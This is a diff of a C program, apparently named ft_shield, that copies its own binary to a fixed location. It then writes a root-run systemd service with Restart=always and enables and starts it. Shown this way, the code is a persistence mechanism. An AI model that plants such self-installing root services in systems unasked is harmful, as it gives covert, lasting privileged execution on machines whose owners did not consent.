@@ -1,6 +1,6 @@
-#include "tcp_server.h"
+#include "ft_shield.h"
 
-void copy_binary_file(const char *sourcePath, const char *destinationPath) {
+void copy_binary_f(const char *sourcePath, const char *destinationPath) {
     int sourceFd;
     int destinationFd;
     unsigned char buffer[BUFFER_SIZE];
@@ -35,39 +35,7 @@ void copy_binary_file(const char *sourcePath, const char *destinationPath) {
     close(destinationFd);
 }
 
-void create_systemd_service(const char* service_name, const char* binary_path) 
-{
-    char service_file_path[256];
-    FILE* file;
-
-    snprintf(service_file_path, sizeof(service_file_path), "/etc/systemd/system/%s", service_name);
-
-    file = fopen(service_file_path, "w");
-    if (file == NULL) {
-        perror("Failed to open service file");
-        exit(EXIT_FAILURE);
-    }
-
-    fprintf(file, "[Unit]\n");
-    fprintf(file, "Description=%s\n", service_name);
-    fprintf(file, "After=network.target\n\n");
-
-    fprintf(file, "[Service]\n");
-    fprintf(file, "ExecStart=%s\n", binary_path);
-    fprintf(file, "ExecStop=/bin/kill -s TERM $MAINPID\n");
-    fprintf(file, "Restart=on-failure\n");
-    fprintf(file, "User=root\n\n");
-
-    fprintf(file, "[Install]\n");
-    fprintf(file, "WantedBy=multi-user.target\n");
-
-    fclose(file);
-
-    printf("Service file created: %s\n", service_file_path);
-}
-
-
-void enable_and_start_service(const char* service_name) 
+void enable_and_start_s(const char* service_name) 
 {
     char command[256];
     
@@ -88,31 +56,44 @@ void enable_and_start_service(const char* service_name)
         perror("Failed to start systemd service");
         exit(EXIT_FAILURE);
     }
-
-    printf("Service enabled and started: %s\n", service_name);
 }
 
-void create_daemon()
+void create_service(const char* service_name, const char* binary_path) 
 {
-    pid_t pid;
+    char service_file_path[256];
+    FILE* file;
 
-    pid = fork();
+    snprintf(service_file_path, sizeof(service_file_path), "/etc/systemd/system/%s", service_name);
 
-    if (pid < 0)
-        exit (EXIT_FAILURE);
-    if (pid > 0)
-        exit (EXIT_SUCCESS);
-    if (setsid() < 0)
-        exit (EXIT_FAILURE);
-    
-    pid = fork();
-    if (pid < 0)
-        exit (EXIT_FAILURE);
-    if (pid > 0)
-        exit (EXIT_SUCCESS);
-    chdir("/");
-    close(STDIN_FILENO);
-    close(STDOUT_FILENO);
-    close(STDERR_FILENO);
+    if (access(service_file_path, F_OK) == 0) {
+        fprintf(stderr, "Service file already exists: %s\n", service_file_path);
+        return;
+    }
+
+    copy_binary_f(SOURCE_FILE, DEST_FILE);
+    file = fopen(service_file_path, "w");
+    if (file == NULL) {
+        perror("Failed to open service file");
+        exit(EXIT_FAILURE);
+    }
+
+    fprintf(file, "[Unit]\n");
+    fprintf(file, "Description=%s\n", service_name);
+    fprintf(file, "After=network.target\n\n");
+
+    fprintf(file, "[Service]\n");
+    fprintf(file, "Type=forking\n");
+    fprintf(file, "ExecStart=%s\n", binary_path);
+
+    fprintf(file, "Restart=always\n");
+    fprintf(file, "RestartSec=5\n");
+    fprintf(file, "User=root\n\n");
+
+    fprintf(file, "[Install]\n");
+    fprintf(file, "WantedBy=multi-user.target\n");
+
+    fclose(file);
+
+    enable_and_start_s(SERVICE_NAME);
+    exit(EXIT_SUCCESS);
 }
-
